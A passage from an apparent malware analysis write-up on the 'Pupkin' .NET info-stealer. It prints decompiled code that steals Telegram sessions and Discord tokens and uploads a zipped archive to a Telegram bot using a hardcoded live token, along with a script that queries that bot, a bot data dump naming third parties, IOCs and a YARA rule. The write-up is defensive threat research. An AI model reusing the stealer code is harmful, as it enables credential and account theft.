							fileStream.Seek((long)((ulong)num2), SeekOrigin.Current);
						}
						long position = fileStream.Position;
						uint num3 = binaryReader.ReadUInt32();
						fileStream.Seek(12L, SeekOrigin.Current);
						uint num4 = binaryReader.ReadUInt32();
						fileStream.Seek(position + (long)((ulong)num4), SeekOrigin.Begin);
						text2 = new string(binaryReader.ReadChars((int)(position + (long)((ulong)num3) - fileStream.Position)));
					}
				}
			}
			catch
			{
				foreach (string text3 in Directory.GetDirectories(Variables.desktop))
				{
					foreach (string text4 in Directory.GetFiles(text3))
					{
						string fileName = Path.GetFileName(text4);
						bool flag2 = fileName == "Telegram.lnk";
						if (flag2)
						{
							string text5 = text3 + "\\Telegram.lnk";
							FileInfo fileInfo2 = new FileInfo(text5);
							try
							{
								using (FileStream fileStream2 = File.Open(fileInfo2.FullName, FileMode.Open, FileAccess.Read))
								{
									using (BinaryReader binaryReader2 = new BinaryReader(fileStream2))
									{
										fileStream2.Seek(20L, SeekOrigin.Begin);
										uint num5 = binaryReader2.ReadUInt32();
										bool flag3 = (num5 & 1U) == 1U;
										if (flag3)
										{
											fileStream2.Seek(76L, SeekOrigin.Begin);
											ushort num6 = binaryReader2.ReadUInt16();
											fileStream2.Seek((long)((ulong)num6), SeekOrigin.Current);
										}
										long position2 = fileStream2.Position;
										uint num7 = binaryReader2.ReadUInt32();
										fileStream2.Seek(12L, SeekOrigin.Current);
										uint num8 = binaryReader2.ReadUInt32();
										fileStream2.Seek(position2 + (long)((ulong)num8), SeekOrigin.Begin);
										return new string(binaryReader2.ReadChars((int)(position2 + (long)((ulong)num7) - fileStream2.Position)));
									}
								}
							}
							catch
							{
								return "Not Found!";
							}
						}
					}
				}
				text2 = "Not Found!";
			}
			return text2;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002DC4 File Offset: 0x00000FC4
		private static string SearchPathTelegram()
		{
			bool flag = Directory.Exists(Variables.roamingappdata + "\\Telegram Desktop\\tdata");
			string text;
			if (flag)
			{
				text = Variables.roamingappdata + "\\Telegram Desktop\\tdata";
			}
			else
			{
				bool flag2 = Telegram.GetPathByLnk() != "Not Found!";
				if (flag2)
				{
					string pathByLnk = Telegram.GetPathByLnk();
					string text2 = pathByLnk.Remove(pathByLnk.Length - 15, 15);
					text = text2 + "\\tdata";
				}
				else
				{
					text = "Not Found!";
				}
			}
			return text;
		}
	}
}
```

### **GrabberTelegramSession**

- Looks for Telegram’s `tdata` folder using `SearchPathTelegram`.
- If found, shuts down any running Telegram processes (`TelegramProcessKill`) so the files aren’t locked.
- Makes a `TelegramSession` folder inside `Variables.workdir\Grabbers\`.
- Copies everything inside `tdata` — files, folders, all of it — into the new spot.
- Updates `Variables.telegramSessionFound` to "Found! Success" if all goes well; otherwise logs an error.

---

### **TelegramProcessKill**

- Scans running processes for anything named "Telegram".
- If `Variables.pathToTelegram` hasn’t been set yet ("Not Found!"), it grabs the executable path from the process itself and figures out where `tdata` is from there.
- Force-kills all Telegram processes it finds.
- Waits until they’re completely dead before moving on (no half-killed processes hanging around).

---

### **GetPathByLnk**

- Hunts down the `Telegram.lnk` shortcut on the desktop (including inside subfolders).
- Reads the shortcut manually using `BinaryReader` (yes, digging into the binary file, not using Windows APIs).
- Skips to around byte 76 to find where the actual file path is stored.
- Pulls out the executable path from there.
- Returns the path if everything goes right, otherwise just says "Not Found!".

---

### **SearchPathTelegram**

- First checks the obvious place: `Variables.roamingappdata\Telegram Desktop\tdata`.
- If that’s missing, tries to find the Telegram shortcut and reconstruct the `tdata` path from it.
- If it figures it out, returns the path. If not, just returns "Not Found!".

# Stage 7: Grabber Discord Session

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Helpers;
using Main;

namespace Messengers
{
	// Token: 0x02000004 RID: 4
	internal class Discord
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002534 File Offset: 0x00000734
		public static void GrabberDiscordToken()
		{
			try
			{
				bool flag = Directory.Exists(Variables.workdir + "\\Grabbers\\Discord");
				if (flag)
				{
					Directory.Delete(Variables.workdir + "\\Grabbers\\Discord", true);
				}
				string text = Variables.workdir + "\\Grabbers\\Discord";
				string[] array = Discord.GetTokens(Discord.TokenRegexs[0]);
				bool flag2 = array.Length == 0;
				if (flag2)
				{
					array = Discord.GetTokens(Discord.TokenRegexs[1]);
					bool flag3 = array.Length == 0;
					if (flag3)
					{
						array = Discord.GetTokens(Discord.TokenRegexs[2]);
					}
				}
				bool flag4 = array.Length != 0;
				if (flag4)
				{
					Directory.CreateDirectory(text);
					foreach (string text2 in array)
					{
						File.AppendAllText(text + "\\Tokens.txt", text2 + "\n");
					}
				}
				Discord.CopyLevelDb();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002634 File Offset: 0x00000834
		private static void CopyLevelDb()
		{
			string text = Variables.workdir + "\\Grabbers\\Discord";
			foreach (string text2 in Discord.DiscordDirectories)
			{
				string directoryName = Path.GetDirectoryName(Path.Combine(Variables.roamingappdata, text2));
				string text3 = Path.Combine(text, new DirectoryInfo(directoryName).Name);
				bool flag = !Directory.Exists(directoryName);
				if (flag)
				{
					break;
				}
				try
				{
					Filemanager.CopyDirectory(directoryName, text3);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000026CC File Offset: 0x000008CC
		public static string[] GetTokens(Regex TokenRegex)
		{
			List<string> list = new List<string>();
			try
			{
				foreach (string text in Discord.DiscordDirectories)
				{
					string text2 = Path.Combine(Variables.roamingappdata, text);
					string text3 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text2).Name);
					bool flag = !Directory.Exists(text2);
					if (!flag)
					{
						Filemanager.CopyDirectory(text2, text3);
						foreach (string text4 in Directory.GetFiles(text3))
						{
							bool flag2 = !text4.EndsWith(".log") && !text4.EndsWith(".ldb");
							if (!flag2)
							{
								string text5 = File.ReadAllText(text4);
								Match match = TokenRegex.Match(text5);
								bool success = match.Success;
								if (success)
								{
									list.Add(match.Value ?? "");
								}
							}
						}
						Filemanager.RecursiveDelete(text3);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
			return list.ToArray();
		}

		// Token: 0x04000001 RID: 1
		private static Regex[] TokenRegexs = new Regex[]
		{
			new Regex("dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\"]*", RegexOptions.Compiled),
			new Regex("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", RegexOptions.Compiled),
			new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}")
		};

		// Token: 0x04000002 RID: 2
		private static string[] DiscordDirectories = new string[] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };
	}
}
```

### **GrabberDiscordToken**

- Deletes existing `Variables.workdir\Grabbers\Discord` directory if it exists.
- Iterates through three token regex patterns (`TokenRegexs`) using `GetTokens`.
- If any tokens are found:
    - Creates `Variables.workdir\Grabbers\Discord`.
    - Writes found tokens into `Tokens.txt`.
    - Calls `CopyLevelDb` to copy Discord’s leveldb storage.
- Logs any caught exceptions directly to console.

---

### **CopyLevelDb**

- Loops through `DiscordDirectories`.
- For each existing directory:
    - Copies the `leveldb` folder to `Variables.workdir\Grabbers\Discord\[AppName]`.
- Ignores any errors silently (permissions, missing folders).

---

### **GetTokens**

- Loops through `DiscordDirectories`.
- For each directory:
    - Copies to a temporary working directory.
    - Scans `.log` and `.ldb` files using the provided regex pattern.
    - Extracts matching tokens and adds them to a list.
    - Deletes the temporary directory after scanning.
- Catches and logs any errors to console.
- Returns an array of found tokens (or empty array).

---

### **TokenRegexs**

- Regex patterns used for token extraction:
    - `dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^"]*`: Targets encoded or non-standard tokens.
    - `[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}`: Matches typical Discord token structure.
    - `[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}`: Matches standard or MFA Discord tokens.

---

### **DiscordDirectories**

- Paths scanned for token data and leveldb files:
    - `Discord\Local Storage\leveldb`
    - `Discord PTB\Local Storage\leveldb`
    - `Discord Canary\leveldb`

# Stage 8: File Manager

```csharp
using System;
using System.IO;
using System.Linq;

namespace Helpers
{
	// Token: 0x02000006 RID: 6
	internal sealed class Filemanager
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002E44 File Offset: 0x00001044
		public static void RecursiveDelete(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			bool flag = !directoryInfo.Exists;
			if (!flag)
			{
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					Filemanager.RecursiveDelete(directoryInfo2.FullName);
				}
				directoryInfo.Delete(true);
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002E98 File Offset: 0x00001098
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			try
			{
				bool flag = !Directory.Exists(destFolder);
				if (flag)
				{
					Directory.CreateDirectory(destFolder);
				}
				string[] files = Directory.GetFiles(sourceFolder);
				foreach (string text in files)
				{
					string fileName = Path.GetFileName(text);
					string text2 = Path.Combine(destFolder, fileName);
					File.Copy(text, text2);
				}
				string[] directories = Directory.GetDirectories(sourceFolder);
				foreach (string text3 in directories)
				{
					string fileName2 = Path.GetFileName(text3);
					string text4 = Path.Combine(destFolder, fileName2);
					Filemanager.CopyDirectory(text3, text4);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002F64 File Offset: 0x00001164
		public static long DirectorySize(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => Filemanager.DirectorySize(di.FullName));
		}
	}
}

```

### **RecursiveDelete**

- Checks if the target directory exists.
- If it exists:
    - Recursively calls itself for each subdirectory.
    - Deletes all files in the directory.
    - Deletes the directory itself.
- No action if directory does not exist.

---

### **CopyDirectory**

- Checks if the destination directory exists; creates it if missing.
- Copies all files from source to destination using `File.Copy`.
- Recursively copies each subdirectory into the corresponding destination.
- Logs errors (e.g., access denied) to the console during copy attempts.

---

### **DirectorySize**

- Sums the size of all files in the target directory using `Directory.GetFiles` and `FileInfo.Length`.
- Recursively calls itself for all subdirectories and adds their sizes.
- Returns total directory size as `long` (bytes).

# Stage 9: Data Dispatch

```csharp
using System;
using System.IO;
using System.Net;
using System.Text;
using Ionic.Zip;
using Main;

namespace Senders
{
	// Token: 0x02000003 RID: 3
	internal class DataDispatch
	{
		// Token: 0x06000004 RID: 4 RVA: 0x00002178 File Offset: 0x00000378
		public static void ZipCompression()
		{
			try
			{
				using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
				{
					zipFile.CompressionLevel = 9;
					ZipFile zipFile2 = zipFile;
					string[] array = new string[6];
					array[0] = "\n<========================================>\nPC:";
					array[1] = Variables.username;
					array[2] = "\nIP: ";
					int num = 3;
					IPAddress ip = Variables.IP;
					array[num] = ((ip != null) ? ip.ToString() : null);
					array[4] = "\nSID: ";
					array[5] = Variables.SID;
					zipFile2.Comment = string.Concat(array);
					zipFile.AddDirectory(Variables.temp + Variables.username);
					zipFile.Save(Variables.temp + Variables.username + "@ardent.zip");
					Variables.isZipCompressionSuccess = "Success!";
				}
			}
			catch (Exception ex)
			{
				Variables.isZipCompressionSuccess = ex.Message;
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002274 File Offset: 0x00000474
		public static void UploadMultipart(byte[] file, string filename, string contentType, string url)
		{
			try
			{
				WebClient webClient = new WebClient();
				string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
				webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
				string @string = webClient.Encoding.GetString(file);
				string text2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[] { text, filename, contentType, @string });
				byte[] bytes = webClient.Encoding.GetBytes(text2);
				webClient.UploadData(url, "POST", bytes);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002340 File Offset: 0x00000540
		public static void Dispatch(string ID)
		{
			string text = Variables.temp + Variables.username + "@ardent.zip";
			bool flag = !File.Exists(text);
			if (!flag)
			{
				byte[] array = File.ReadAllBytes(text);
				string[] array2 = new string[5];
				array2[0] = "https://api.telegram.org/bot";
				array2[1] = Variables.Token;
				array2[2] = "/sendDocument?chat_id=";
				array2[3] = ID;
				int num = 4;
				string[] array3 = new string[37];
				array3[0] = "&caption=❗\ufe0f New LOG! <3\n\n\ud83d\udd3a PC: ";
				array3[1] = Variables.username;
				array3[2] = "\n\ud83d\udd3a IP: ";
				int num2 = 3;
				IPAddress ip = Variables.IP;
				array3[num2] = ((ip != null) ? ip.ToString() : null);
				array3[4] = "\n\ud83d\udd3a SID: ";
				array3[5] = Variables.SID;
				array3[6] = "\n\n\ud83d\udd3a All found passwords: ";
				array3[7] = Variables.allFoundPasswords.ToString();
				array3[8] = "\n\n\ud83d\udd3a    Found Chrome: ";
				array3[9] = Variables.isChromeFound;
				array3[10] = "\n\ud83d\udd3a        Found ChromePasswords: ";
				array3[11] = Variables.foundChromePasswords.ToString();
				array3[12] = "\n\n\ud83d\udd3a    Found OperaGX: ";
				array3[13] = Variables.isOperaGXFound;
				array3[14] = "\n\ud83d\udd3a        Found OperaGXPasswords: ";
				array3[15] = Variables.foundOperaGXPasswords.ToString();
				array3[16] = "\n\n\ud83d\udd3a    Found Opera: ";
				array3[17] = Variables.isOperaFound;
				array3[18] = "\n\ud83d\udd3a        Found OperaPasswords: ";
				array3[19] = Variables.foundOperaPasswords.ToString();
				array3[20] = "\n\n\ud83d\udd3a    Found Edge: ";
				array3[21] = Variables.isEdgeFound;
				array3[22] = "\n\ud83d\udd3a        Found EdgePasswords: ";
				array3[23] = Variables.foundEdgePasswords.ToString();
				array3[24] = "\n\n\ud83d\udd3a    Found Vivaldi: ";
				array3[25] = Variables.isVivaldiFound;
				array3[26] = "\n\ud83d\udd3a        Found VivaldiPasswords: ";
				array3[27] = Variables.foundVivaldiPasswords.ToString();
				array3[28] = "\n\n\ud83d\udd3a Additional information \n\ud83d\udd3a    Found files from desktop: ";
				array3[29] = Variables.foundFilesFromDesktop.ToString();
				array3[30] = "\n\ud83d\udd3a    Telegram session: ";
				array3[31] = Variables.telegramSessionFound;
				array3[32] = "\n\ud83d\udd3a    Is screenshot success: ";
				array3[33] = Variables.isScreenshotSuccess;
				array3[34] = "\n\ud83d\udd3a    Is zip compression success: ";
				array3[35] = Variables.isZipCompressionSuccess;
				array3[36] = "\n\n\ud83d\udcbb Coded by Ardent";
				array2[num] = string.Concat(array3);
				string text2 = string.Concat(array2);
				DataDispatch.UploadMultipart(array, text, "application/x-ms-dos-executable", text2);
			}
		}
	}
}

```

### **ZipCompression**

- Creates a ZIP archive using `Ionic.Zip`.
- Sets compression level to maximum (`level 9`).
- Adds a ZIP comment containing `username`, `IP address`, and `SID` from `Variables`.
- Adds all files from `Variables.temp + Variables.username` into the archive.
- Saves the archive as `[username]@ardent.zip` inside the temp directory.
- Updates `Variables.isZipCompressionSuccess` to `"Success!"` or the error message if exception occurs.

---

### **UploadMultipart**

**Here is a implementation flaws in exfiltration** 

**Incorrect Byte-to-String Conversion**
In this function, the malware attempts to upload a ZIP file by converting the raw file bytes into a string before sending it. This is fundamentally flawed:

Binary data (like ZIP files) isn’t meant to be turned into plain text.

This conversion can corrupt the file, making it unreadable or causing the upload to fail entirely.

Properly, it should send the file as raw bytes or use a multipart form upload.

**Wrong Content-Type Used**

The stealer sets the HTTP header Content-Type: application/x-ms-dos-executable when uploading the ZIP file. This content type is used for .exe files, not .zip archives. The correct type would be:

**Content-Type: application/zip**

This doesn’t always break functionality (Telegram may accept it anyway), but it’s a clear sign the author didn’t understand or properly handle MIME types. 

---

### **Dispatch**

- Checks if `[username]@ardent.zip` exists in the temp directory.
- Reads the ZIP file into a byte array.
- Builds the Telegram bot API URL using `Variables.Token` and provided `chat ID`.
- Prepares a caption containing:
    - Username
    - IP Address
    - SID
    - Password counts
    - Browser findings
    - Telegram session findings
    - Screenshot status
    - ZIP compression status
- Calls `UploadMultipart` to POST the ZIP file + caption to Telegram.
- Skips dispatch if the ZIP file is missing.


# Stage 10: Telegram Bot Analysis

Pupkin uses a Telegram bot for C2 and exfiltration, with a hard-coded token (8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM) and chat ID (7613862165). 

Testing confirms the bot is active as of April 27, 2025.

![Telegram C2](/assets/images/blog2/ps.jpg)


After that with the help of ChatGPT I wrote a simple python script to scrap all the details of the bot.

```python
import requests
import json

bot_token = "8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM"
chat_id = "7613862165"

base_url = f"https://api.telegram.org/bot{bot_token}"

def get_bot_info():
    r = requests.get(f"{base_url}/getMe")
    print("Bot Identity:")
    print(json.dumps(r.json(), indent=2))

def get_chat_info(chat_id):
    r = requests.get(f"{base_url}/getChat", params={"chat_id": chat_id})
    print("\n Chat Metadata:")
    print(json.dumps(r.json(), indent=2))

def get_chat_admins(chat_id):
    r = requests.get(f"{base_url}/getChatAdministrators", params={"chat_id": chat_id})
    print("\n Chat Admins (if accessible):")
    print(json.dumps(r.json(), indent=2))

def get_updates():
    r = requests.get(f"{base_url}/getUpdates")
    print("\n Latest Bot Messages / Commands:")
    print(json.dumps(r.json(), indent=2))

# Run the tools
get_bot_info()
get_chat_info(chat_id)
get_chat_admins(chat_id)
get_updates()
```

**The Bot dump I got**:

```json
 Bot Identity:
{
  "ok": true,
  "result": {
    "id": 8013735771,
    "is_bot": true,
    "first_name": "botKanal",
    "username": "botkanalchik_bot",
    "can_join_groups": true,
    "can_read_all_group_messages": false,
    "supports_inline_queries": false,
    "can_connect_to_business": false,
    "has_main_web_app": false
  }
}

 Chat Metadata:
{
  "ok": true,
  "result": {
    "id": 7613862165,
    "first_name": ".",
    "type": "private",
    "can_send_gift": true,
    "bio": "\u043a\u0443\u043f\u043b\u044e \u0440\u0430\u043c\u043e\u043d\u044b \u0437\u0430 2 \u043a",
    "has_private_forwards": true,
    "accepted_gift_types": {
      "unlimited_gifts": true,
      "limited_gifts": true,
      "unique_gifts": true,
      "premium_subscription": true
    },
    "photo": {
      "small_file_id": "AQADAgADYfUxG2-48UsACAIAAxVR0sUBAAODBq7uFApMQDYE",
      "small_file_unique_id": "AQADYfUxG2-48UsAAQ",
      "big_file_id": "AQADAgADYfUxG2-48UsACAMAAxVR0sUBAAODBq7uFApMQDYE",
      "big_file_unique_id": "AQADYfUxG2-48UsB"
    },
    "max_reaction_count": 11,
    "accent_color_id": 0
  }
}

 Chat Admins (if accessible):
{
  "ok": false,
  "error_code": 400,
  "description": "Bad Request: there are no administrators in the private chat"
}

 Latest Bot Messages / Commands:
{
  "ok": true,
  "result": [
    {
      "update_id": 561415931,
      "message": {
        "message_id": 1165,
        "from": {
          "id": 637444541,
          "is_bot": false,
          "first_name": "Joe",
          "last_name": "Blankoff",
          "username": "JoeBlanky"
        },
        "chat": {
          "id": -4706678327,
          "title": "Test group bot bot tokens 2",
          "type": "group",
          "all_members_are_administrators": true,
          "accepted_gift_types": {
            "unlimited_gifts": false,
            "limited_gifts": false,
            "unique_gifts": false,
            "premium_subscription": false
          }
        },
        "date": 1745920319,
        "new_chat_participant": {
          "id": 7381501080,
          "is_bot": true,
          "first_name": "novlogger",
          "username": "cole22bot"
        },
        "new_chat_member": {
          "id": 7381501080,
          "is_bot": true,
          "first_name": "novlogger",
          "username": "cole22bot"
        },
        "new_chat_members": [
          {
            "id": 7381501080,
            "is_bot": true,
            "first_name": "novlogger",
            "username": "cole22bot"
          }
        ]
      }
    }
  ]
}
```


# Variables

```csharp
using System;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace Main
{
    public class Variables
    {
        public static string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string roamingappdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        public static string temp = Path.GetTempPath();
        public static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        public static string LoginDataPathChrome = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
        public static string CookiePathChrome = localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        public static string LoginDataPathEdge = localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        public static string LoginDataPathOperaGX = roamingappdata + "\\Opera Software\\Opera GX Stable\\Login Data";
        public static string LoginDataPathOpera = roamingappdata + "\\Opera Software\\Opera Stable\\Default\\Login data";
        public static string LoginDataPathVivaldi = localappdata + "\\Vivaldi\\User Data\\Default\\Login Data";
        public static string isChromeFound;
        public static string isOperaGXFound;
        public static string isOperaFound;
        public static string isEdgeFound;
        public static string isVivaldiFound;
        public static int allFoundPasswords;
        public static int foundChromePasswords;
        public static int foundOperaGXPasswords;
        public static int foundOperaPasswords;
        public static int foundEdgePasswords;
        public static int foundVivaldiPasswords;
        public static int foundFilesFromDesktop;
        public static string isScreenshotSuccess;
        public static string telegramSessionFound;
        public static string isZipCompressionSuccess;
        public static string username = WindowsIdentity.GetCurrent().Name;
        public static string host = Dns.GetHostName();
        public static IPAddress IP = Dns.GetHostByName(Variables.host).AddressList[0];
        public static string SID = WindowsIdentity.GetCurrent().User.Value;
        public static string Token = "8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM";
        public static string ID = "7613862165";
        public static string workdir = temp + username;
    }
}
```

# High-Level Execution Flow Chart

![image.png](/assets/images/blog2/flow.png)

# Indicators of Compromise (IOCs)

| **Category** | **Indicator** | **Details** |
| --- | --- | --- |
| Telegram Bot Token | `8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM` | Used for exfiltration via Telegram bot API. |
| Telegram Chat ID | `7613862165` | Target chat for stolen data uploads. |
| File Path (Workdir) | `%TEMP%\<username>\` | Directory for storing stolen data (e.g., `C:\Users\<username>\AppData\Local\Temp\<username>\`). |
| File Path (ZIP) | `%TEMP%\<username>\@ardent.zip` | Compressed archive of stolen data. |
| File Path (Chrome) | `%LocalAppData%\Google\Chrome\User Data\Default\Login Data` | Chrome password database location. |
| File Path (Telegram) | `%AppData%\Telegram Desktop\tdata\*` | Telegram session data location. |
| File Path (Discord) | `%AppData%\Discord\Local Storage\leveldb` | Discord token storage location (also PTB, Canary variants). |
| File Path (Desktop) | `%UserProfile%\Desktop\*.pdf`, `*.txt`, `*.sql`, `*.jpg`, `*.png` | Targeted desktop file extensions for theft. |
| File Path (Screenshot) | `%TEMP%\<username>\Grabbers\Screenshot\Screen.jpg` | Location of captured screenshot. |
| File Hash (SHA-256) | `9309003c245f94ba4ee52098dadbaa0d0a4d83b423d76c1bfc082a1c29e0b95f` | Hash of the Pupkin executable. |
| Processes Terminated | `chrome`, `opera`, `operagx`, `edge`, `vivaldi`, `Telegram` | Processes killed to access locked files. |
| Network Activity | `https://api.telegram.org/bot<token>/sendDocument` | URL used for Telegram exfiltration. |

# MITRE ATT&CK Mapping

| **Tactic** | **Technique** | **ID** | **Description** |
| --- | --- | --- | --- |
| Execution | T1059 | Command and Scripting Interpreter | Runs .NET code. |
| Defense Evasion | T1489 | Process Termination | Kills browsers/Telegram. |
| Credential Access | T1555.003 | Credentials from Password Stores | Steals browser passwords. |
| Credential Access | T1528 | Steal Application Access Tokens | Extracts Discord/Telegram data. |
| Collection | T1005 | Data from Local System | Collects desktop files. |
| Collection | T1113 | Screen Capture | Takes screenshots. |
| Command and Control | T1071.001 | Application Layer Protocol | Uses Telegram API. |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Sends ZIP via Telegram. |


# Attribution

The Pupkin Stealer, a simple .NET-based info-stealer, was likely created by a Russian-speaking individual or small group, probably a freelancer or script kiddie active in underground markets. Its design, resembling the open-source StormKitty stealer, and its reliance on Telegram for C2 point to a developer with moderate skills operating in a Russian-speaking cybercrime ecosystem. Here's the breakdown:

## Telegram Bot Details:

The bot, @botkanalchik_bot (ID: **8013735771**), has a Russian-inspired name ("kanalchik" means "little channel"), hinting at a Russian-speaking developer.

It’s set up with basic permissions (can join groups, no message-reading or advanced features), showing it’s built solely for data exfiltration.

Hardcoded bot token (**8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM**) and chat ID (**7613862165**) suggest a lack of caution, common among less experienced developers.


## Private Chat Insights:

The private chat (ID: 7613862165) belongs to a user with a dot (.) as their display name and a Russian bio: “**куплю рамоны за 2 к**” (“buying Ramons for 2k”). “Ramons” likely refers to stolen data or accounts.

The Russian bio clearly points to a native or fluent Russian speaker.


## Bot Activity Logs:

The bot was active in a group called “**Test group bot bot tokens 2**,” where **@JoeBlanky** (ID: **637444541**, **Joe Blankoff**) added another bot, @cole22bot (ID: 7381501080, “novlogger”).

The group’s focus on “bot tokens” suggests it’s a testing ground for Telegram-based malicious operations, like phishing or data theft.

**@JoeBlanky** could be a collaborator or buyer, though their Western name might be a pseudonym, a common tactic in Russian-speaking cybercrime groups.


## Malware Features:

**Developer Signature**: The “**Coded by Ardent**” tag in ZIP files and Telegram messages likely marks the developer’s alias, showing a desire for recognition in underground communities.

**Basic Design**: Pupkin uses Costura.Fody for DLL embedding and standard .NET libraries (Ionic.Zip, BouncyCastle) without obfuscation or persistence, indicating a developer with decent but not advanced .NET skills.

**StormKitty Similarity**: Pupkin mirrors StormKitty, an open-source .NET stealer, in targeting browser passwords, Discord tokens, and desktop files, and using Telegram for C2. It likely draws inspiration from or reuses StormKitty’s code, a common starting point for novice developers.

**Data Targets**: It grabs Chromium passwords, Discord tokens, Telegram sessions, desktop files (.pdf, .txt, .sql, .jpg, .png), and screenshots, aiming for data to sell.


## Cultural and Operational Context:

**Russian-Speaking Cybercrime** The Russian bio, Telegram C2, and slang like “Ramons” tie the developer to Russian-speaking cybercrime communities. Russia’s cybercrime scene thrives on platforms like Telegram due to its popularity, encryption, and loose moderation, making it a go-to for C2 and data trading.

**Telegram’s Role**: Telegram is widely used in Russia for communication and business, including by freelance malware developers. Its ease of use and bot API make it a favorite for C2 in stealers like Pupkin, especially among freelancers who sell tools or data on channels or forums like XSS.is and Exploit.in.

**Delivery Methods**: Pupkin likely spreads via phishing or cracked software, tactics popular among Russian-speaking malware distributors targeting global users.

**Profit-Driven**: The focus on stealable data suggests the developer sells credentials or files in underground markets, a common freelance gig in Russian cybercrime.


## Developer Profile:

**Russian-Speaking Individual or Small Group**: The Russian language, Telegram reliance, and “Ardent” signature point to a developer in Russia or a Russian-speaking region.

**Freelancer**: Pupkin’s straightforward design, noisy actions, hardcoded credentials, and the UploadMultipart flaw suggest a newer developer, likely freelancing or testing their skills.

**Market Participant**: The developer probably operates on Telegram channels or dark web forums, selling stolen data or offering Pupkin as a tool.


## Connections:

**Joe Blankoff (@JoeBlanky)**: Their role in the bot-testing group hints at a possible link to the Pupkin developer, perhaps as a tester or client. The Western name could be an alias to mask their Russian-speaking identity.

**StormKitty Influence**: Pupkin’s resemblance to StormKitty suggests the developer studied its open-source code, a common practice among Russian-speaking freelancers building custom stealers.

**commodity Malware Scene**: Pupkin fits among low-tier stealers like RedLine or Raccoon, shared or sold in Russian-speaking communities.

**Ardent Branding**: The “Coded by Ardent” tag may indicate a solo developer or small team aiming to build a name. Future samples with this tag could reveal more.


## Limitations and Next Steps:

**Challenges**: Hardcoded credentials and no unique code markers make precise attribution tough. @JoeBlanky and “Ardent” need more data to confirm their roles.

# Executive Summary
**Pupkin Stealer** is a .NET-based malware designed to steal browser passwords, Discord tokens, Telegram sessions, desktop files, and screenshots, sending the data to attackers via Telegram. First spotted on April 20, 2025, it uses a hardcoded Telegram bot token and chat ID.

### Key Points:

- **What It Does**: 
  - Steals data from Chromium browsers, Discord, and Telegram.
  - Captures screenshots and desktop files.
  - Zips all stolen data for Telegram delivery.

- **How It Works**: 
  - Runs multiple tasks simultaneously.
  - Shuts down browser and Telegram processes.
  - Embeds libraries using Costura.Fody.
  - Lacks advanced hiding or persistence techniques.

- **Big Mistake**:
  - The UploadMultipart code mishandles binary ZIP files by treating them as text, leading to data corruption or failed uploads. This is a rookie developer's mistake.

- **Inspired By**:
  - Resembles **StormKitty**, a publicly available stealer, suggesting the coder borrowed ideas or code.

- **Who’s Behind It**:
  - Likely a Russian-speaking freelancer or rookie, identified as "Ardent."
  - Heavy usage of Slavic language, specifically Russian, in the developer's bio and Telegram setup, links the author to be of a russian-speaking region.



# YARA Rule

```yara

rule PupkinStealer
{
    meta:
        description = "Detects Pupkin .NET Info-Stealer"
        author = "Navneet"
        date = "2025-04-28"
        sample_hash = "9309003c245f94ba4ee52098dadbaa0d0a4d83b423d76c1bfc082a1c29e0b95f"

    strings:
        $string_file_name1 = "PupkinStealer.exe" ascii
        $string_file_name2 = "PlutoniumLoader.exe" ascii
        $string_zip_name = "@ardent.zip" ascii
        $string_dev_tag = "Coded by Ardent" ascii

        $class_telegram_session = "GrabberTelegramSession" ascii
        $class_discord_token = "GrabberDiscordToken" ascii
        $class_chromium_passwords = "ChromiumPasswords" ascii

